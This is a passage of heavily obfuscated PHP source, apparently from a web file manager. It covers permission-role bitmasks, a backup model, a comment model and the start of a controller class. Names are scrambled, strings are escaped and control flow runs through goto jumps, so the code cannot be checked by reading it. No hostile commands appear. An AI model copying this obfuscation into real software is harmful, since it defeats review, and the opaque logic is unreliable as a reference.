$_SERVER[¼]; $Fôñ‰‘ŸÒ¥ = array(array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2068]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2070], $B˜„×ğÍ¡[2071] => 6, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2074]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2075], $B˜„×ğÍ¡[2071] => 1, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2076]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2077], $B˜„×ğÍ¡[2071] => 2, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2078]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2077], $B˜„×ğÍ¡[2071] => 3, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2079]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2080], $B˜„×ğÍ¡[2071] => 4, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => self::AUTH_SHOW | self::AUTH_VIEW), array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2081]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2082], $B˜„×ğÍ¡[2071] => 5, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($B˜„×ğÍ¡[383] => LNG($B˜„×ğÍ¡[2083]), $B˜„×ğÍ¡[2069] => $B˜„×ğÍ¡[2084], $B˜„×ğÍ¡[2071] => 7, $B˜„×ğÍ¡[2072] => 1, $B˜„×ğÍ¡[2073] => 0)); return $Fôñ‰‘ŸÒ¥; } public static function authCheck($c×·½¨›ö¤, $A•Âõ“†) { $c×·½¨›ö¤ = intval($c×·½¨›ö¤); if (_get($GLOBALS, $_SERVER[¼][453])) { return !0; } if ($c×·½¨›ö¤ <= 0) { return !1; } if (($c×·½¨›ö¤ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c×·½¨›ö¤ & $A•Âõ“†); } public static function authCheckShow($eƒœ‘ªí„ø) { return self::authCheck($eƒœ‘ªí„ø, self::AUTH_SHOW); } public static function authCheckView($b…À›šñ’³) { return self::authCheck($b…À›šñ’³, self::AUTH_VIEW); } public static function authCheckDownload($f¦¦¹Ã«¸ä) { return self::authCheck($f¦¦¹Ã«¸ä, self::AUTH_DOWNLOAD); } public static function authCheckUpload($f÷ÅÖÉÓâ¬) { return self::authCheck($f÷ÅÖÉÓâ¬, self::AUTH_UPLOAD); } public static function authCheckEdit($Eêå‰ŸÁğ¨) { return self::authCheck($Eêå‰ŸÁğ¨, self::AUTH_EDIT); } public static function authCheckRemove($B‹„ƒ²ÌµÊ) { return self::authCheck($B‹„ƒ²ÌµÊ, self::AUTH_REMOVE); } public static function authCheckShare($C‚ËƒØ§›æ) { return self::authCheck($C‚ËƒØ§›æ, self::AUTH_SHARE); } public static function authCheckComment($bŠ¢«²Óá§) { return self::authCheck($bŠ¢«²Óá§, self::AUTH_COMMENT); } public static function authCheckEvent($eñ‹‹½›Í›) { return self::authCheck($eñ‹‹½›Í›, self::AUTH_EVENT); } public static function authCheckRoot($EÀçŒ•¬) { return self::authCheck($EÀçŒ•¬, self::AUTH_ROOT); } public static function authDisable($fê îÙª‘Ø, $EÁ¡ÅëŸ†Ï) { if (intval($fê îÙª‘Ø) <= 0) { return 0; } return intval($fê îÙª‘Ø) & ~$EÁ¡ÅëŸ†Ï; } public $optionType = "\123\x79\x73\x74\145\155\x2e\x73\x6f\165\162\143\145\101\165\x74\150\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\x61\x75\164\150", "\154\141\x62\145\x6c", "\x64\151\163\160\154\141\171", "\163\171\x73\x74\145\x6d", "\163\x6f\162\164"); public function initData() { $D²—Õ°šÑ = $this->authDefault(); foreach ($D²—Õ°šÑ as $BëÊ†ˆù†) { $this->add($BëÊ†ˆù†); } } public function listData($aàÈŒ©¬ªî = false, $e®ğ’íÜ® = "\x73\157\162\x74", $f àëíï¼˜ = false) { return parent::listData($aàÈŒ©¬ªî, $e®ğ’íÜ®, $f àëíï¼˜); } public function update($aĞ³ÈÎÄ, $Aª¾¿î£‡ê) { $eæÒ´ÑÜŒƒ =& $_SERVER[¼]; $dÊÏ³–”ƒ© = parent::listData($aĞ³ÈÎÄ); $Cğ©³•×†¦ = $this->findByName($Aª¾¿î£‡ê[$eæÒ´ÑÜŒƒ[28]]); if (!$dÊÏ³–”ƒ© || $Cğ©³•×†¦ && $Cğ©³•×†¦[$eæÒ´ÑÜŒƒ[364]] != $dÊÏ³–”ƒ©[$eæÒ´ÑÜŒƒ[364]]) { return !1; } $this->filterAuth($Aª¾¿î£‡ê[$eæÒ´ÑÜŒƒ[373]]); return parent::update($aĞ³ÈÎÄ, $Aª¾¿î£‡ê); } public function remove($bï½¤±Ô»Ê) { $Cå”âä—Â = parent::listData($bï½¤±Ô»Ê); if (!$Cå”âä—Â || $Cå”âä—Â[$_SERVER[¼][1073]]) { return !1; } return parent::remove($bï½¤±Ô»Ê); } public function add($fœˆÜŸí‘Ö = array()) { goto f´Òİ•èÙ; fğ™íĞªãº: return parent::insert($fœˆÜŸí‘Ö); goto D¹Ü ÛÎ°ë; f¾‚”¦æ: $fœˆÜŸí‘Ö = array_merge($bÂ¿à—î¹, $fœˆÜŸí‘Ö); $fœˆÜŸí‘Ö[$a¡‰ÃíÂ‘·[2088]] = $this->getSort(); $this->filterAuth($fœˆÜŸí‘Ö[$a¡‰ÃíÂ‘·[373]]); goto fğ™íĞªãº; f´Òİ•èÙ: $a¡‰ÃíÂ‘· =& $_SERVER[¼]; if ($this->findByName($fœˆÜŸí‘Ö[$a¡‰ÃíÂ‘·[28]])) { return !1; } $bÂ¿à—î¹ = array($a¡‰ÃíÂ‘·[28] => $a¡‰ÃíÂ‘·[33], $a¡‰ÃíÂ‘·[373] => 1, $a¡‰ÃíÂ‘·[2085] => $a¡‰ÃíÂ‘·[2086], $a¡‰ÃíÂ‘·[2087] => 1, $a¡‰ÃíÂ‘·[1073] => 0, $a¡‰ÃíÂ‘·[2088] => 0); goto f¾‚”¦æ; D¹Ü ÛÎ°ë: } private function getSort() { $c÷³¼¨Á•Ã =& $_SERVER[¼]; $e…‰±•ÍÊ = parent::listData(); $E·Ş×İ‹íä = array_to_keyvalue($e…‰±•ÍÊ, $c÷³¼¨Á•Ã[33], $c÷³¼¨Á•Ã[2088]); return empty($E·Ş×İ‹íä) ? 0 : max($E·Ş×İ‹íä) + 1; } private function filterAuth(&$d½˜´šÑ±ë) { goto aã÷„‘ºæ“; aã÷„‘ºæ“: if (!$d½˜´šÑ±ë) { return; } $BÌºÆáœÊ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EÍô¸­Ó™ = array(); goto C‹§¾ä¼–; C‹§¾ä¼–: foreach ($BÌºÆáœÊ as $AÆ¬¼¾òÖ¶) { if ($d½˜´šÑ±ë & $AÆ¬¼¾òÖ¶) { $EÍô¸­Ó™[] = $AÆ¬¼¾òÖ¶; } } if (in_array(self::AUTH_ROOT, $EÍô¸­Ó™)) { $d½˜´šÑ±ë = array_sum($BÌºÆáœÊ); return; } $eÑ³çå¿ò = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto d¶åˆ™á©¼; d¶åˆ™á©¼: foreach ($EÍô¸­Ó™ as $AÆ¬¼¾òÖ¶) { if (isset($eÑ³çå¿ò[$AÆ¬¼¾òÖ¶])) { $EÍô¸­Ó™ = array_merge($EÍô¸­Ó™, $eÑ³çå¿ò[$AÆ¬¼¾òÖ¶]); } } $EÍô¸­Ó™[] = self::AUTH_SHOW; $d½˜´šÑ±ë = array_sum(array_unique($EÍô¸­Ó™)); goto bŒ‹ù‹ÆĞ; bŒ‹ù‹ÆĞ: } public function sort($b†ß£ˆ¶ÙÍ, $FÛÏ‘õĞ…ê) { return parent::update($b†ß£ˆ¶ÙÍ, $FÛÏ‘õĞ…ê); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x62\x61\x63\153\165\x70\114\151\163\164"; public $field = array("\151\x6f", "\x6e\x61\x6d\x65", "\163\x74\141\x74\165\163", "\x63\x6f\x6e\x74\145\x6e\x74", "\x72\145\163\165\154\x74", "\164\151\x6d\x65\x46\162\157\155", "\x74\x69\155\x65\x54\x6f"); public function config() { goto B´İ¯ä¬¢; B´İ¯ä¬¢: $e„óÓøĞª‚ =& $_SERVER[¼]; $B­™œ‡Ö‘É = Model($e„óÓøĞª‚[1081])->get($e„óÓøĞª‚[704]); $B­™œ‡Ö‘É = json_decode($B­™œ‡Ö‘É, !0); goto AÉ¬‹»ˆ™; f‰¸Ë¨‹·Œ: if (isset($C«ó…‹ÊÏ¬[$e„óÓøĞª‚[187]])) { $C«ó…‹ÊÏ¬[$e„óÓøĞª‚[187]] = json_decode($C«ó…‹ÊÏ¬[$e„óÓøĞª‚[187]], !0); } if (isset($B­™œ‡Ö‘É[$e„óÓøĞª‚[187]])) { $C«ó…‹ÊÏ¬[$e„óÓøĞª‚[187]][$e„óÓøĞª‚[1379]] = $B­™œ‡Ö‘É[$e„óÓøĞª‚[187]]; unset($B­™œ‡Ö‘É[$e„óÓøĞª‚[187]]); } return array_merge($C«ó…‹ÊÏ¬, $B­™œ‡Ö‘É); goto A¥àÔ¿½; d³¶†õ°®’: Action($e„óÓøĞª‚[2089])->taskInit(); $Fº×¬–Ñ = Model($e„óÓøĞª‚[2090])->listData(); foreach ($Fº×¬–Ñ as $a®õõİùğÊ) { if ($a®õõİùğÊ[$e„óÓøĞª‚[1073]] == $e„óÓøĞª‚[83] && $a®õõİùğÊ[$e„óÓøĞª‚[1392]] == $e„óÓøĞª‚[2091]) { $C«ó…‹ÊÏ¬ = $a®õõİùğÊ; break; } } goto f‰¸Ë¨‹·Œ; AÉ¬‹»ˆ™: $B­™œ‡Ö‘É = is_array($B­™œ‡Ö‘É) ? $B­™œ‡Ö‘É : array(); if (!isset($B­™œ‡Ö‘É[$e„óÓøĞª‚[684]])) { $B­™œ‡Ö‘É[$e„óÓøĞª‚[684]] = $e„óÓøĞª‚[464]; } $C«ó…‹ÊÏ¬ = array(); goto d³¶†õ°®’; A¥àÔ¿½: } public function listData($F…¡Ûä‰¨ = false, $CÛœÍ®‰ê = "\x6d\157\144\151\146\171\x54\x69\x6d\145", $C¾É‹‚ªˆ = false) { return parent::listData($F…¡Ûä‰¨, $CÛœÍ®‰ê, !0); } public function lastItem() { $d¬»ùª‹Õ¸ = $this->listData(); return !empty($d¬»ùª‹Õ¸[0]) ? $d¬»ùª‹Õ¸[0] : null; } public function kill($B¡ŠåŞ¥Æ±) { goto AßìËŸî¡™; AÎõªä–è: return $this->remove($B¡ŠåŞ¥Æ±); goto báÎíùÆÕº; eæè¨©Šíö: $c¦‚›ì¥ = $cºÆ¹Û«‹Ğ[$aŒ÷£ £ª[28]]; $a¼ôá³©õ¶ = TEMP_FILES . $aŒ÷£ £ª[702] . $c¦‚›ì¥ . $aŒ÷£ £ª[8]; IO::remove($a¼ôá³©õ¶, !1); goto AÎõªä–è; E–Áñ‚¿Ì‚: Task::kill($aŒ÷£ £ª[703]); Task::kill($aŒ÷£ £ª[721]); Task::kill($aŒ÷£ £ª[728]); goto eæè¨©Šíö; AßìËŸî¡™: $aŒ÷£ £ª =& $_SERVER[¼]; $cºÆ¹Û«‹Ğ = $this->listData($B¡ŠåŞ¥Æ±); if (!$cºÆ¹Û«‹Ğ || empty($cºÆ¹Û«‹Ğ[$aŒ÷£ £ª[28]])) { return !0; } goto E–Áñ‚¿Ì‚; báÎíùÆÕº: } public function remove($A¸¦ÅÆó¦’) { $fßƒáä±„ = $this->listData($A¸¦ÅÆó¦’); if (!$fßƒáä±„) { return !0; } return $this->backupRemove($fßƒáä±„); } private function backupRemove($Fë‡‰¾‚áÎ) { $fÌã¤ÊÅøÈ =& $_SERVER[¼]; parent::remove($Fë‡‰¾‚áÎ[$fÌã¤ÊÅøÈ[364]]); $e¿‚…â‘¸Ê = "\173\151\x6f\x3a{$Fë‡‰¾‚áÎ[$fÌã¤ÊÅøÈ[683]]}\175\57\x64\x61\x74\x61\x62\141\163\x65\x2f\142\x61\x63\x6b\165\x70\x5f" . $Fë‡‰¾‚áÎ[$fÌã¤ÊÅøÈ[28]]; IO::remove($e¿‚…â‘¸Ê, !1); return !0; } public function start() { goto C–¥ª¾í‘Û; cäŠ˜éºë: if (!$D±ˆŞ“¿Æ±->dbFile()) { return !1; } if ($eÅœÏ´İØ[$A¦‰Ê”µ…[684]] == $A¦‰Ê”µ…[464]) { $D±ˆŞ“¿Æ±->file(); } Backup::set(array($A¦‰Ê”µ…[681] => 1, $A¦‰Ê”µ…[695] => time())); goto CêĞ›‹¡‡; DÖÎÍö«µ: if (!$eÅœÏ´İØ || $eÅœÏ´İØ[$A¦‰Ê”µ…[1376]] != $A¦‰Ê”µ…[83]) { return !1; } $a¢¦Ø·Ù Ì = $this->process(); foreach ($a¢¦Ø·Ù Ì as $Cå—ÍÒŒø) { if ($Cå—ÍÒŒø) { return Task::restart($Cå—ÍÒŒø[$A¦‰Ê”µ…[364]]); } } goto E›ÀÙËæÅÁ; CêĞ›‹¡‡: return !0; goto fÉì²‘ã“; C–¥ª¾í‘Û: $A¦‰Ê”µ… =& $_SERVER[¼]; if ($GLOBALS[$A¦‰Ê”µ…[6]][$A¦‰Ê”µ…[84]][$A¦‰Ê”µ…[2092]] != $A¦‰Ê”µ…[83]) { return !0; } $eÅœÏ´İØ = $this->config(); goto DÖÎÍö«µ; E›ÀÙËæÅÁ: $D±ˆŞ“¿Æ± = new Backup(); $D±ˆŞ“¿Æ±->keep(); if (!$D±ˆŞ“¿Æ±->db()) { return !1; } goto cäŠ˜éºë; fÉì²‘ã“: } public function process() { $d‚¾»Ó¦í… =& $_SERVER[¼]; return array($d‚¾»Ó¦í…[686] => Task::get($d‚¾»Ó¦í…[703]), $d‚¾»Ó¦í…[689] => Task::get($d‚¾»Ó¦í…[721]), $d‚¾»Ó¦í…[164] => Task::get($d‚¾»Ó¦í…[728])); } public function restore() { $f½†½Í—¸š =& $_SERVER[¼]; ActionCall($f½†½Í—¸š[2093], !0, 1); ActionCall($f½†½Í—¸š[2093], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\156\164"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\x6d\x65" => "\143\x6f\x6d\155\145\156\164\x5f\x6d\x65\164\x61", "\155\x65\x74\x61\x46\151\145\x6c\144" => "\143\x6f\x6d\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($cŠó©î±íÒ) { $B¸½¹ïŠ†± =& $_SERVER[¼]; if ($cŠó©î±íÒ[$B¸½¹ïŠ†±[2094]]) { $FÎ—Í¾ªª = $this->where(array($B¸½¹ïŠ†±[2095] => $cŠó©î±íÒ[$B¸½¹ïŠ†±[2094]]))->find(); if (!$FÎ—Í¾ªª || $FÎ—Í¾ªª[$B¸½¹ïŠ†±[368]] != $cŠó©î±íÒ[$B¸½¹ïŠ†±[368]] || $FÎ—Í¾ªª[$B¸½¹ïŠ†±[452]] != $cŠó©î±íÒ[$B¸½¹ïŠ†±[452]]) { return !1; } $this->where(array($B¸½¹ïŠ†±[2095] => $cŠó©î±íÒ[$B¸½¹ïŠ†±[2094]]))->setAdd($B¸½¹ïŠ†±[2096], 1); } return $this->add($cŠó©î±íÒ); } public function remove($BğŞ‰Åî‰’) { $bÉĞÂ’Ùƒ› =& $_SERVER[¼]; $D‹´Ïé”§Œ = array($bÉĞÂ’Ùƒ›[2095] => $BğŞ‰Åî‰’); $eÍ£ÜäŒæ• = $this->where($D‹´Ïé”§Œ)->find(); if ($eÍ£ÜäŒæ•[$bÉĞÂ’Ùƒ›[2094]]) { $this->where(array($bÉĞÂ’Ùƒ›[2095] => $eÍ£ÜäŒæ•[$bÉĞÂ’Ùƒ›[2094]]))->setAdd($bÉĞÂ’Ùƒ›[2096], -1); } return $this->where($D‹´Ïé”§Œ)->delete(); } public function edit($c›˜İÑğƒä, $BÎÃà¸Äİ) { $eˆÖùíÎÖ =& $_SERVER[¼]; $Aï¢ã¢šŠ = array($eˆÖùíÎÖ[2095] => $c›˜İÑğƒä); return $this->where($Aï¢ã¢šŠ)->save(array($eˆÖùíÎÖ[2097] => $BÎÃà¸Äİ)); } public function prasise($aµÊ‡£¬–İ) { $C†‰½‹‚” =& $_SERVER[¼]; $b¤ˆÛ”ò×… = Model($C†‰½‹‚”[2098]); $a­ëªµ³­ = array($C†‰½‹‚”[2095] => $aµÊ‡£¬–İ, $C†‰½‹‚”[1395] => USER_ID); $e“‰Ü²Ãó = $b¤ˆÛ”ò×…->where($a­ëªµ³­)->find(); if (!$e“‰Ü²Ãó) { $b¤ˆÛ”ò×…->add($a­ëªµ³­); $D„íŠ×¡„Á = $this->where(array($C†‰½‹‚”[2095] => $aµÊ‡£¬–İ))->setAdd($C†‰½‹‚”[2099], 1); } else { $b¤ˆÛ”ò×…->where($a­ëªµ³­)->delete(); $D„íŠ×¡„Á = $this->where(array($C†‰½‹‚”[2095] => $aµÊ‡£¬–İ))->setAdd($C†‰½‹‚”[2099], -1); } return $D„íŠ×¡„Á; } public function targetInfo($bğÌ¥È¤Å¿, $C…“ „ŒêÌ) { goto E¬™¶ğ¼‘ƒ; D¨Å“Û™·„: return $e÷£¹Å‚°â; goto C—šì‹Ìôß; E¬™¶ğ¼‘ƒ: $fÚÚô‡Ïñ =& $_SERVER[¼]; $C¸Ïí±é¤ = array($fÚÚô‡Ïñ[517] => $bğÌ¥È¤Å¿, $fÚÚô‡Ïñ[518] => $C…“ „ŒêÌ); $B–àÁóºÇ = $this->where($C¸Ïí±é¤)->count(); goto aÛ¡»ºÕÀ±; aÛ¡»ºÕÀ±: $b›Û¥ß°õ¹ = "\122\x49\107\110\x54\40\112\x4f\111\116\40{$this->tablePrefix}\143\x6f\155\155\x65\156\x74\x5f\x70\x72\141\x69\163\145\40\163\x74\141\162\x20\x6f\x6e\x20\x63\x6f\155\155\145\156\x74\x2e\x63\157\155\x6d\x65\156\x74\x49\104\40\x3d\40\163\x74\x61\x72\56\x63\157\155\x6d\145\x6e\x74\111\104"; $c«‹ËÊØË· = $this->alias($fÚÚô‡Ïñ[338])->where($C¸Ïí±é¤)->join($b›Û¥ß°õ¹, $fÚÚô‡Ïñ[2100])->count(); $e÷£¹Å‚°â = array($fÚÚô‡Ïñ[2101] => $B–àÁóºÇ, $fÚÚô‡Ïñ[2102] => $c«‹ËÊØË·); goto D¨Å“Û™·„; C—šì‹Ìôß: } public function listData($DŒš³¢ñÖø) { $d§Ò¹Àòí© =& $_SERVER[¼]; if (isset($DŒš³¢ñÖø[$d§Ò¹Àòí©[2103]])) { if ($DŒš³¢ñÖø[$d§Ò¹Àòí©[2103]]) { $DŒš³¢ñÖø[$d§Ò¹Àòí©[2104]] = array($d§Ò¹Àòí©[923], intval($DŒš³¢ñÖø[$d§Ò¹Àòí©[2103]])); } unset($DŒš³¢ñÖø[$d§Ò¹Àòí©[2103]]); } if (isset($DŒš³¢ñÖø[$d§Ò¹Àòí©[2105]])) { if ($DŒš³¢ñÖø[$d§Ò¹Àòí©[2105]]) { $DŒš³¢ñÖø[$d§Ò¹Àòí©[2104]] = array($d§Ò¹Àòí©[920], intval($DŒš³¢ñÖø[$d§Ò¹Àòí©[2105]])); } unset($DŒš³¢ñÖø[$d§Ò¹Àòí©[2105]]); } return $this->_listData($DŒš³¢ñÖø); } private function _listData($F±†Ÿß®Ş¼) { $f–øº¯ËŠ‡ =& $_SERVER[¼]; $CÅ÷çî¦»Æ = $this->where($F±†Ÿß®Ş¼)->_makeOrder()->selectPage(100); $this->_listAppendParent($CÅ÷çî¦»Æ[$f–øº¯ËŠ‡[351]]); $this->_listAppendUser($CÅ÷çî¦»Æ[$f–øº¯ËŠ‡[351]]); $this->_listAppendMeta($CÅ÷çî¦»Æ[$f–øº¯ËŠ‡[351]]); return $CÅ÷çî¦»Æ; } private function _makeOrder() { $bóììÒñö =& $_SERVER[¼]; $dÅ»»Ç¾ÚŒ = array($bóììÒñö[2099], $bóììÒñö[2096], $bóììÒñö[184]); $Aßò‹ÍÌæˆ = Input::get($bóììÒñö[403], $bóììÒñö[7], $bóììÒñö[386], $dÅ»»Ç¾ÚŒ); $aã’ä¸Ş„ = Input::get($bóììÒñö[404], $bóììÒñö[7], $bóììÒñö[1397], array($bóììÒñö[2106], $bóììÒñö[401])); $e‹‹ª…ØÉá = $Aßò‹ÍÌæˆ . $bóììÒñö[50] . $aã’ä¸Ş„; return $this->order($e‹‹ª…ØÉá); } private function _listAppendParent(&$Fˆ§ŞˆÏ¤) { goto dèƒ¼õ’æ«; dèƒ¼õ’æ«: $Eˆ½¸±ƒ› =& $_SERVER[¼]; $Cï¬Ô¿²åÒ = array_unique(array_to_keyvalue($Fˆ§ŞˆÏ¤, $Eˆ½¸±ƒ›[33], $Eˆ½¸±ƒ›[2094])); $Cï¬Ô¿²åÒ = array_remove_value($Cï¬Ô¿²åÒ, $Eˆ½¸±ƒ›[464]); goto A‚Ø˜Ãà³µ; c×ùÌçÑ¼Ÿ: foreach ($Fˆ§ŞˆÏ¤ as &$bÇ“‚ÆÏ‹‹) { if (isset($eÚšäğŒ©[$bÇ“‚ÆÏ‹‹[$Eˆ½¸±ƒ›[2094]]])) { $bÇ“‚ÆÏ‹‹[$Eˆ½¸±ƒ›[2107]] = $eÚšäğŒ©[$bÇ“‚ÆÏ‹‹[$Eˆ½¸±ƒ›[2094]]]; } } goto B¼˜´¼ğ“á; A‚Ø˜Ãà³µ: if (!$Cï¬Ô¿²åÒ) { return; } $eÚšäğŒ© = $this->where(array($Eˆ½¸±ƒ›[2095] => array($Eˆ½¸±ƒ›[7], $Cï¬Ô¿²åÒ)))->select(); $eÚšäğŒ© = array_to_keyvalue($eÚšäğŒ©, $Eˆ½¸±ƒ›[2104]); goto c×ùÌçÑ¼Ÿ; B¼˜´¼ğ“á: } private function _listAppendUser(&$C°‰Ë‹À½ô) { goto B£¸‡ËÅ¹; bÆÃ‹æ§ÌŸ: foreach ($C°‰Ë‹À½ô as &$CÎÓµ¦ªÑÕ) { $CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[531]] = $D† Ş¡ğÄÕ[$CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[1404]]]; if (isset($CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[2107]])) { $CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[2107]][$dïõà¶Æ˜ì[531]] = $D† Ş¡ğÄÕ[$CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[2107]][$dïõà¶Æ˜ì[1404]]]; } } goto cµ†Ù‘ñÖ; B£¸‡ËÅ¹: $dïõà¶Æ˜ì =& $_SERVER[¼]; $aÉĞ‚ß¼¨Í = array_unique(array_to_keyvalue($C°‰Ë‹À½ô, $dïõà¶Æ˜ì[33], $dïõà¶Æ˜ì[1404])); $aÉĞ‚ß¼¨Í = array_remove_value($aÉĞ‚ß¼¨Í, $dïõà¶Æ˜ì[464]); goto dœô¼»š§Œ; dœô¼»š§Œ: if (count($aÉĞ‚ß¼¨Í) == 0) { return; } foreach ($C°‰Ë‹À½ô as $CÎÓµ¦ªÑÕ) { if (isset($CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[2107]])) { $aÉĞ‚ß¼¨Í[] = $CÎÓµ¦ªÑÕ[$dïõà¶Æ˜ì[2107]][$dïõà¶Æ˜ì[1404]]; } } $D† Ş¡ğÄÕ = Model($dïõà¶Æ˜ì[473])->userListInfo($aÉĞ‚ß¼¨Í); goto bÆÃ‹æ§ÌŸ; cµ†Ù‘ñÖ: } private function _listAppendMeta(&$AéÕêØÒ•Ş) { goto cŸéØöÚ; BÉ»Ç§Âª: if (!$aØâÒòë½ˆ) { return !1; } foreach ($AéÕêØÒ•Ş as &$aî»Ë“÷ğÜ) { $aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[413]] = $aØâÒòë½ˆ[$aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[2104]]]; if (isset($aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[2107]])) { $aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[2107]][$díĞÔ¸¦Ä[413]] = $aØâÒòë½ˆ[$aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[2107]][$díĞÔ¸¦Ä[2104]]]; } } goto B¶´®çÇ°¹; E±œèÖÂ‰—: if (!$cËï¬“®ª) { return; } foreach ($AéÕêØÒ•Ş as $aî»Ë“÷ğÜ) { if (isset($aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[2107]])) { $cËï¬“®ª[] = $aî»Ë“÷ğÜ[$díĞÔ¸¦Ä[2107]][$díĞÔ¸¦Ä[2104]]; } } $aØâÒòë½ˆ = $this->metaList($cËï¬“®ª); goto BÉ»Ç§Âª; cŸéØöÚ: $díĞÔ¸¦Ä =& $_SERVER[¼]; $cËï¬“®ª = array_unique(array_to_keyvalue($AéÕêØÒ•Ş, $díĞÔ¸¦Ä[33], $díĞÔ¸¦Ä[2104])); $cËï¬“®ª = array_remove_value($cËï¬“®ª, $díĞÔ¸¦Ä[464]); goto E±œèÖÂ‰—; B¶´®çÇ°¹: } private function metaList($Bšò•÷‰à¬) { goto D×†„Òã…¿; D×†„Òã…¿: $aŒŒÜãµ =& $_SERVER[¼]; if (!$Bšò•÷‰à¬) { return array(); } $C¹íŞ¤Ñ„ò = array($aŒŒÜãµ[2104] => array($aŒŒÜãµ[7], $Bšò•÷‰à¬)); goto D”ª’Åï¾; D”ª’Åï¾: $fÖ÷‰Û³ = Model($aŒŒÜãµ[2108])->where($C¹íŞ¤Ñ„ò)->select(); $fÖ÷‰Û³ = array_to_keyvalue_group($fÖ÷‰Û³, $aŒŒÜãµ[2104]); foreach ($fÖ÷‰Û³ as $D…Á£”¢´å => $f¦ßª¬Ü¤) { $DŒø¾ƒÕÁ† = array(); foreach ($f¦ßª¬Ü¤ as $CäÚóÇÉï) { $DŒø¾ƒÕÁ†[$CäÚóÇÉï[$aŒŒÜãµ[89]]] = $CäÚóÇÉï[$aŒŒÜãµ[356]]; } $fÖ÷‰Û³[$D…Á£”¢´å] = $DŒø¾ƒÕÁ†; } goto dƒôÄ‰Ëè; dƒôÄ‰Ëè: return $fÖ÷‰Û³ ? $fÖ÷‰Û³ : array(); goto eè…¿Â¨­; eè…¿Â¨­: } } goto d¸ã¸¯À‚Š; F™³¶Ùâ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e„ÂïŸ—À¨; e„ÂïŸ—À¨: $cÍİâ ŠÕ =& $_SERVER[¼]; global $in, $config; $this->config =& $config; goto bêó‹ê®öˆ; bêó‹ê®öˆ: $this->in =& $in; $this->values[$cÍİâ ŠÕ[6]] =& $config; $this->values[$cÍİâ ŠÕ[7]] =& $in; goto AÁĞôæ†­; AÁĞôæ†­: $this->tpl = TEMPLATE . MOD . $cÍİâ ŠÕ[8]; $this->_classObjectID = mt_rand(0, 10000); goto bÈÖÓÉ–›; bÈÖÓÉ–›: } public function loadClass($d¶³©óÉÜ) { if (1 === func_num_args()) { $this->{$d¶³©óÉÜ} = new $d¶³©óÉÜ(); } else { $bŠø®°“§ = new ReflectionClass($d¶³©óÉÜ); $eİé½¦šÕ = func_get_args(); array_shift($eİé½¦šÕ); $this->{$d¶³©óÉÜ} = $bŠø®°“§->newInstanceArgs($eİé½¦šÕ); } return $this->{$d¶³©óÉÜ}; } protected function assign($C‘ ë÷È–, $F¬İå½â¨) { $this->values[$C‘ ë÷È–] = $F¬İå½â¨; } protected function display($CÂÂ’ÄˆÑ) { ob_end_clean(); 